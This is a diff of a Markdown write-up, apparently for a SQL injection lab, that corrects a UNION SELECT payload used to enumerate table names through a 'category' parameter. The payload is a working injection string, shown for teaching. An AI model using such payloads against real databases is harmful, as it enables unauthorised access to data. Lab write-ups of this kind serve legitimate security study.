@@ -46,7 +46,7 @@ Now that we know the current query has two columns, we can start enumerating the
 Now let's enumerate the tables present in the `public` database by setting the `category` parameter to:
 
 ```
-' UNION SELECT table_name, NULL FROM information_schema.tables-- WHERE table_schema='public'--
+' UNION SELECT table_name, NULL FROM information_schema.tables WHERE table_schema='public'--
 ```
 
 ![21](https://github.com/Knign/Write-ups/assets/110326359/091474f0-7311-44ba-8c9f-167342b6df20)
